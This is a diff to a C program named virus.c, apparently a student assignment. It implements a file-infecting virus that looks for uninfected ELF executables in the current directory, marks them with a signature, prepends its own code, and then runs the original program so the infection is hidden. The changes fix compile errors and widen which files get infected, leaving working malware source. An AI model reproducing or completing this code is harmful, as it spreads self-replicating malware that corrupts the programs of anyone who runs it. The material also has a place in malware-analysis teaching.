@@ -9,7 +9,8 @@
 
 // "Random" sig.
 #define SIG 8026
-#define SIZE 14056
+// Found by running wc virus.c -c in the command line.
+#define SIZE 13936
 
 // Not a huge fan of this because usually in C I use a .h file
 // but due to the requirements of this assignment I don't think
@@ -19,11 +20,11 @@ bool isELF(char* fn);
 bool beenInfected(char* fn);
 void infect(char* chosenVictim, int virusDescriptor);
 bool isOrigin(int virusDescriptor);
-void runVictimAnyway(int virusDescriptor, mode_t mode, int tot_size, c$
+void runVictimAnyway(int virusDescriptor, mode_t mode, int tot_size, char *argv[]);
 
 
 // Main method for virus.c
-int main(int arrgc, char *argv[]) {
+int main(int argc, char *argv[]) {
         // Retrieve information from the object at pos 0 and return 
         // it to the buffer (stat st)
         int virusDescriptor = open(argv[0], O_RDONLY);
@@ -52,7 +53,7 @@ int main(int arrgc, char *argv[]) {
                 // Localize the SIG.
                 int sig = SIG;
                 // Move the read location back to the beginning of the
-                // file.
+                 // file.
                 lseek(virusDescriptor, 0, SEEK_SET);
                 // Send the temp to the virus file. 
                 sendfile(temp, virusDescriptor, NULL, st.st_size);
@@ -65,9 +66,9 @@ int main(int arrgc, char *argv[]) {
         }
         // If it's not the original virus file.
         else {
-                // Assignment mandates that we have to make the
+                // Assignment mandates that we have to make the 
                 // original intended functionality of this file run.
-                runVictimAnyway(virusDescriptor, st.st_mode, st.st_siz$
+                runVictimAnyway(virusDescriptor, st.st_mode, st.st_size, argv);
         }
         // Final close.
         close(virusDescriptor);
@@ -79,7 +80,7 @@ char* findNewVictim(int st_inode) {
         struct stat st;
         // Open the current directory.
         DIR *dir = opendir("./");
-        // dirent: structure type used to return info about dir entries   
+        // dirent: structure type used to return info about dir entries
         struct dirent *dp;
         // readdir returns null if it reached the end of a dir stream.
         while((dp = readdir(dir)) != NULL) {
@@ -94,7 +95,7 @@ char* findNewVictim(int st_inode) {
                 if(st.st_ino == st_inode) {
                         // Move on.
                         continue;
-                }
+                        }
                 // We only want an ELF file that has NOT already been
                 // infected. If both cases are true, return its
                 // d_name so we can start the good stuff. 
@@ -118,14 +119,9 @@ char* findNewVictim(int st_inode) {
 // bytes will equal {0x7f, 'E','L','F'}.
 bool isELF(char* fn) {
         // First two entries in a dir are . and .. and obviously
-        // this is not what we are looking for.
+        // this is not what we are looking for. This also ignores our
+        // temporary files.
         if(fn[0] == '.') {
-                return false;
-        }
-        // Until I can find a better way to do it, I'm going to ignore
-        // file with a 'v' as the starting letter because I don't want
-        // to infect the virus.c file.
-        else if(fn[0] == 'v') {
                 return false;
         }
         // Open() will return the file descriptor.
@@ -164,18 +160,18 @@ bool beenInfected(char* fn) {
         // Now just return whether the signature found is the same
         // as the one we have been designating.
         return (sig == SIG);
-  }
+}
 
 // This is where we actually carry out the infecting.
 void infect(char* chosenVictim, int virusDescriptor) {
-        // Open() will return the file descriptor, this is the victim'$
+        // Open() will return the file descriptor, this is the victim's.
         int victimfd = open(chosenVictim, O_RDONLY);
         // File status.
         struct stat st;
         // Read the file status and assign it to st at &st.
         fstat(victimfd, &st);
         // Get the size of the victim file.
-        int victimSize = st.st_size();
+        int victimSize = st.st_size;
         // Store the SIG locally.
         int sig = SIG;
         // Create a temporary file. Also do this with a leading '.'.
@@ -201,7 +197,7 @@ bool isOrigin(int virusDescriptor) {
 }
 
 // Work the intended functionality anyway.
-void runVictimAnyway(int virusDescriptor, mode_t mode, int tot_size, c$
+void runVictimAnyway(int virusDescriptor, mode_t mode, int tot_size, char *argv[]) {
         // Make a temp file.
         int temp = creat(".tempf", mode);
         // Set back to the beginning of the file.
